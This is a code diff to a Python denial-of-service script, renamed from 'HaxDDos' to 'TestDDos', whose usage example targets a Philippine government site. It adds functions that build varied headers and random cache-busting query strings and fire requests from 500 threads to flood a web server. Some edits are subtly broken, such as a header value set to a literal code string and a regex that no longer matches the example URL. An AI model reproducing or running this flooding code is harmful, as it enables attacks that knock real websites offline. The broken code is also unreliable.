@@ -27,8 +27,20 @@ def set_safe():
 	safe=1
 	
 # generates a user agent array
+def useragent_list():
+	global headers_useragents
+	headers_useragents.append('null\r\n')
+	headers_useragents.append('null\r\n')
+	
+	return(headers_useragents)
 
-
+# generates a referer array
+def referer_list():
+	global headers_referers
+	headers_referers.append('null\r\n')
+	headers_referers.append('null\r\n')
+	return(headers_referers)
+	
 #builds random ascii string
 def buildblock(size):
 	out_str = ''
@@ -39,19 +51,45 @@ def buildblock(size):
 
 def usage():
 	print '---------------------------------------------------'
-	print 'USAGE: HaxDDos.py <url> (ex. HaxDDos.py http://www.gov.ph)'
+	print 'USAGE: TestDDos.py <url> (ex. TestDDos.py http://www.gov.ph)'
 	print 'you can add "safe" after url, to autoshut after dos'
 	print '---------------------------------------------------'
+acceptall = [
+        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflate",
+        "Accept-Encoding: gzip, deflate",
+        "Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflate",
+        "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Charset: iso-8859-1Accept-Encoding: gzip",
+        "Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5Accept-Charset: iso-8859-1",
+        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1Accept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1Accept-Charset: utf-8, iso-8859-1;q=0.5",
+        "Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*Accept-Language: en-US,en;q=0.5",
+        "Accept: text/html, application/xhtml+xml, image/jxr, */*Accept-Encoding: gzipAccept-Charset: utf-8, iso-8859-1;q=0.5Accept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1",
+        "Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1Accept-Encoding: gzipAccept-Language: en-US,en;q=0.5Accept-Charset: utf-8, iso-8859-1;q=0.5,"
+        "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8Accept-Language: en-US,en;q=0.5",
+        "Accept-Charset: utf-8, iso-8859-1;q=0.5Accept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1",
+        "Accept: text/html, application/xhtml+xml",
+        "Accept-Language: en-US,en;q=0.5",
+        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1",
+        "Accept: text/plain;q=0.8,image/png,*/*;q=0.5Accept-Charset: iso-8859-1",
+    ]
 
 	
-connection = "Connection: null\r\n"
-        accept = Choice(acceptall) + "\r\n"
-        connection += "Cache-Control: max-age=0\r\n"
-        connection += "pragma: no-cache\r\n"
-        connection += "X-Forwarded-For: " + spoofer() + "\r\n"
-        referer = "Referer: null\r\n"
-        useragent = "User-Agent: null\r\n"
-        header = referer + useragent + accept + connection + "\r\n\r\n"
+#http request
+def httpcall(url):
+	useragent_list()
+	referer_list()
+	code=0
+	if url.count("?")>0:
+		param_joiner="&"
+	else:
+		param_joiner="?"
+	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
+	request.add_header('User-Agent', random.choice(headers_useragents))
+	request.add_header('Cache-Control', 'null\r\n')
+	request.add_header('Accept-Charset', 'Choice(acceptall) + "\r\n"')
+	request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5,10)))
+	request.add_header('Keep-Alive', random.randint(110,120))
+	request.add_header('Connection', 'null\r\n')
+	request.add_header('Host',host)
 	try:
 			urllib2.urlopen(request)
 	except urllib2.HTTPError, e:
@@ -106,7 +144,7 @@ else:
 		url = sys.argv[1]
 		if url.count("/")==2:
 			url = url + "/"
-		m = re.search('http\://([^/]*)/?.*', url)
+		m = re.search('https\://([^/]*)/?.*', url)
 		host = m.group(1)
 		for i in range(500):
 			t = HTTPThread()
